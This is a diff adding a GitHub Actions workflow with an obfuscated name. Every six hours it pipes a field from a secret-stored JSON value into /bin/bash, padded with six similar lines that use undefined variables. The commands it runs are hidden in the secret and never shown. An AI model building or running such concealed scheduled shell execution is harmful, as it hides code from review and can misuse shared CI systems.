@@ -1,0 +1,23 @@
+name: huangzhangboliang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangzhangboliang
+        env:
+          gz60: ${{ secrets.gz60 }}
+        run: |
+          echo $gz60 | jq -r .znmc25282 | /bin/bash
+          echo $l27241 | jq -r .r026 | /bin/bash
+          echo $eq41918 | jq -r .h8 | /bin/bash
+          echo $fbp63 | jq -r .fiq8885 | /bin/bash
+          echo $t3 | jq -r .oh48 | /bin/bash
+          echo $nh5 | jq -r .zkz525 | /bin/bash
+          echo $rp648 | jq -r .epx9 | /bin/bash
+
